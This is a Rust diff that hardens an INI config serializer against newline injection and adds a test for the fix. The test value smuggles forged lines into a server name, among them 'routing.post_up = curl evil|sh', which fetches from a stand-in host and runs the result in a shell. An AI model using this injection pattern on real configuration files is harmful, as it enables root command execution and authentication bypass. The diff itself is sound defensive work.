@@ -291,6 +291,24 @@ fn unquote(s: &str) -> String {
 }
 
 pub(crate) fn quote_if_needed(s: &str) -> String {
+    // SECURITY backstop. The INI grammar is line-oriented with no line-continuation,
+    // so a control character (newline/CR/NUL/…) embedded in a value would split it
+    // into forged extra `key = value` / `[section]` lines when the file is re-parsed —
+    // an injection that could smuggle `routing.post_up` (root RCE) or
+    // `[user:…]`/`password_hash` (auth bypass) past the struct-level guards that run
+    // BEFORE serialization. No legitimate config value is multi-line, so we strip
+    // ASCII control chars (TAB kept) as a fail-closed backstop for every caller that
+    // renders through `to_ini_string`. Done first, before the quoting decision.
+    let owned;
+    let s: &str = if s.chars().any(|c| c.is_control() && c != '\t') {
+        owned = s
+            .chars()
+            .filter(|&c| !c.is_control() || c == '\t')
+            .collect::<String>();
+        owned.as_str()
+    } else {
+        s
+    };
     let needs = s.is_empty()
         || s.starts_with(' ')
         || s.ends_with(' ')
@@ -368,6 +386,35 @@ mode = obfs
         assert_eq!(s.get("pass"), Some("p@ss; with semicolon"));
         assert_eq!(s.get("plain"), Some("value"));
         assert_eq!(s.get("empty"), Some(""));
+    }
+
+    #[test]
+    fn serialize_strips_control_chars_blocks_injection() {
+        // SECURITY: a value carrying a newline must not split into a forged extra
+        // key/section when the serialized text is re-parsed.
+        let mut doc = IniDoc::new();
+        let mut sec = Section::new("profile", Some("x".to_string()));
+        sec.set(
+            "server_name",
+            "cf.com\nrouting.post_up = curl evil|sh\n[user:evil]",
+        );
+        doc.push(sec);
+        let text = doc.to_string();
+        assert!(
+            !text.lines().any(|l| {
+                let t = l.trim_start();
+                t.starts_with("routing.post_up") || t.starts_with("[user:")
+            }),
+            "control-char injection leaked a line: {text:?}"
+        );
+        let re = IniDoc::parse(&text).unwrap();
+        assert_eq!(re.sections.len(), 1);
+        let s = &re.sections[0];
+        assert_eq!(s.entries.len(), 1);
+        assert_eq!(
+            s.get("server_name"),
+            Some("cf.comrouting.post_up = curl evil|sh[user:evil]")
+        );
     }
 
     #[test]
